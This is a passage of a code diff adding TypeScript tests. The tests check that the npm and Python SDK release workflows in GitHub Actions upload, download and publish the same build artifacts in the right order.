+    expect(pack).toBeLessThan((build.steps ?? []).indexOf(upload));
+    expect((build.steps ?? [])[pack]['working-directory']).toBeUndefined();
+    expect(upload.with?.path).toBe(`${build.defaults?.run?.['working-directory']}/*.tgz`);
+    expect(upload.with?.['if-no-files-found']).toBe('error');
+    // The two jobs agree on the artifact and on where it lands, and the download runs first.
+    expect(download.with?.name).toBe(upload.with?.name);
+    expect([publish.needs ?? []].flat()).toContain('build');
+    const target = /^npm publish\s+(?:-\S+\s+)*(\S+)/m.exec(runsOf(publish))?.[1];
+    expect(target).toBe(
+      `"$GITHUB_WORKSPACE"/${dirOf(download.with?.path)}/${path.posix.basename(upload.with?.path ?? '')}`,
+    );
+    const publishAt = (publish.steps ?? []).findIndex(step => /^npm publish\b/m.test(executableLines(step.run ?? '')));
+    expect(indexOfUses(publish, 'actions/download-artifact')).toBeLessThan(publishAt);
+  });
+
+  it('python-sdk-release.yml: the files python -m build writes are the ones the publish step uploads', () => {
+    const { build, publish } = jobsOf('python-sdk-release.yml');
+    const upload = only(build, 'actions/upload-artifact');
+    const download = only(publish, 'actions/download-artifact');
+    const pypi = only(publish, 'pypa/gh-action-pypi-publish');
+    // `python -m build` writes dist/ under the working directory of its step.
+    const built = (build.steps ?? []).find(step => /^python -m build$/m.test(executableLines(step.run ?? '')));
+    expect(built?.['working-directory']).toBeDefined();
+    expect(dirOf(upload.with?.path)).toBe(`${built?.['working-directory']}/dist`);
+    expect(upload.with?.['if-no-files-found']).toBe('error');
+    // The same artifact and the same directory in the three places, and the download runs first.
+    expect(download.with?.name).toBe(upload.with?.name);
+    expect(dirOf(download.with?.path)).toBe(dirOf(upload.with?.path));
+    expect(dirOf(pypi.with?.['packages-dir'])).toBe(dirOf(download.with?.path));
+    expect([publish.needs ?? []].flat()).toContain('build');
+    expect(indexOfUses(publish, 'actions/download-artifact')).toBeLessThan(
+      indexOfUses(publish, 'pypa/gh-action-pypi-publish'),
+    );
   });
 });
 
